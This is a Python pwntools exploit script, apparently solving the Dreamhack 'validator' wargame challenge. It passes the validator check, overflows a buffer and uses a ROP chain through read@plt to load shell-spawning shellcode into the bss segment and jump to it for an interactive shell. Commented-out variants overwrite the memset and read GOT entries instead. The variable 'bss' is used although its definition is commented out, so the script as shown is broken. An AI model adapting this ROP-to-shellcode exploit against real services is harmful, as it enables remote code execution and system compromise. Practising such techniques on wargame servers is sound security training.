from pwn import *

#p = process('./validator_dist')
p = remote('host3.dreamhack.games', 9582)
e = ELF('./validator_dist')
r = ROP(e)

read_plt = e.plt['read']
read_got = e.got['read']
memset_plt = e.plt['memset']
memset_got = e.got['memset']
pop_rdi = r.find_gadget(['pop rdi'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
#bss = e.bss()

payload = b'DREAMHACK!'
list = []

for i in range(118, -1, -1):
    list.append(i)

payload += bytes(list)
payload += b'B'*7

#bss 영역 사용
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(len(shellcode)+1)
payload += p64(read_plt)
payload += p64(bss)

#memset_got overwrite
#payload += p64(pop_rdi) + p64(0)
#payload += p64(pop_rsi_r15) + p64(memset_got) + p64(0)
#payload += p64(pop_rdx) + p64(len(shellcode)+1)
#payload += p64(read_plt)
#payload += p64(memset_got)

#read_got overwrite
#payload += p64(pop_rdi) + p64(0)
#payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
#payload += p64(pop_rdx) + p64(len(shellcode)+1)
#payload += p64(read_plt)
#payload += p64(read_got)

sleep(0.5)
p.send(payload)
sleep(0.5)
p.send(shellcode)

p.interactive()
